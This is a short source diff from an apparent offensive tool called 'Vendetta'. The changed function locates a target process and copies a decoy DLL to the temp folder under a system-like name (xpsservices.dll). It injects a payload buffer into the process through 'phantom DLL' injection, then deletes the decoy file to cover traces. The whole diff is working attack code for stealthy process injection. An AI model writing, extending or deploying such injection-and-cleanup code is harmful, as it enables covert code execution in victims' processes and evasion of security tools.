@@ -1,4 +1,4 @@
-﻿#include "vendetta/debug_logger.h"
+﻿#include "vendetta/logger.h"
 #include "vendetta/vendetta.h"
 
 #include "config.h"
@@ -37,7 +37,6 @@ namespace
 {
 	int ProxyThread()
 	{
-		std::wstring dll_path = BENIGN_DLL;
 		DWORD pId = Vendetta::FindProcessId(TARGET);
 		if (pId == 0)
 		{
@@ -52,18 +51,23 @@ namespace
 			return 1;
 		}
 
+		wchar_t tempPath[MAX_PATH];
+		GetTempPathW(MAX_PATH, tempPath);
+		const std::wstring targetDll = std::wstring(tempPath) + L"xpsservices.dll";
+
+		CopyFileW(BENIGN_DLL.data(), targetDll.c_str(), FALSE);
+
 		PROCESS_INFORMATION pi;
 		pi.hProcess = hProcess;
 		pi.dwProcessId = pId;
-		if (!Vendetta::InjectPhantomDll(pi, buf, sizeof(buf), dll_path))
+		if (!Vendetta::InjectPhantomDll(pi, buf, sizeof(buf), targetDll))
 		{
 			Log(LogError, "Injection failed");
 			return 1;
 		}
-		else
-		{
-			Log(LogInfo, "Injection succeeded");
-		}
+		Log(LogInfo, "Injection succeeded");
+
+		DeleteFileW(targetDll.c_str());
 
 		return 0;
 	}
